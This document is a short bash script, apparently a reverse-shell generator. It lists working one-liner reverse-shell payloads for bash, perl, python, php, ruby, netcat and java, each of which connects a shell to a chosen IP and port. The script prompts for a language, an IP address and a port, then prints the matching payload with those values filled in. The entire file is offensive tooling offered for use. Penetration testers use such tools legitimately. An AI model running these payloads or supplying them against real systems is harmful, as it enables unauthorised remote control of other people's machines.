#!/bin/bash

bold=$(tput bold)

# Get hosts IP adreses
raw_ips=$(ip a | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep -v 127.0.0.1 | awk 'BEGIN { ORS=";" }; {gsub("/[0-9]*","",$2); print $2}')
IFS=';' read -r -a host_ips <<< "$raw_ips"

# Supported languages
declare -A languages
languages=( ["bash"]="bash -i >& /dev/tcp/IPADDR/PORT 0>&1" ["perl"]="perl -e 'use Socket;\$i=\"IPADDR\";\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ["python"]="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IPADDR\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", ["php"]="php -r '\$sock=fsockopen(\"IPADDR\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ["ruby"]="ruby -rsocket -e'f=TCPSocket.open(\"IPADDR\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ["netcat"]="nc -e /bin/sh IPADDR PORT" ["java"]="r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/IPADDR/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor();" )

# Hello text
printf ' '; printf '=%.0s' {1..98}; echo
printf '|'; printf ' %.0s' {1..98}; printf '|'; echo
printf '|'; printf ' %.0s' {1..27}; printf 'Reverse shell generator by AnyKeyShik Rarity'; printf ' %.0s' {1..27};printf '|'; echo
printf '|'; printf ' %.0s' {1..98}; printf '|'; echo
printf ' '; printf '=%.0s' {1..98}; echo; echo

# Language list
printf "Supported technologies: "
data_string="${!languages[*]}"
printf "${data_string//${IFS:0:1}/, }"; echo

# Language choice
printf "Please choice your language: "
read choice
choice=$(echo "$choice" | tr '[:upper:]' '[:lower:]')
shell="${languages[$choice]}"

# IP choice
data_string="${host_ips[*]}"
echo; printf "List of IP of your host. Please choice one: "
printf "${data_string//${IFS:0:1}/, }"; echo
printf "Required ip: "
read ip

# Port specifying
echo; printf "Please specifying port for your shell: "
read port

# Shell generation
echo; printf "${bold}Reverse Shell $choice @ $ip:$port"; echo
shell_with_ip=$(echo "${shell/IPADDR/$ip}")
printf '.%.0s' {1..50};echo
echo "${shell_with_ip/PORT/$port}"; echo
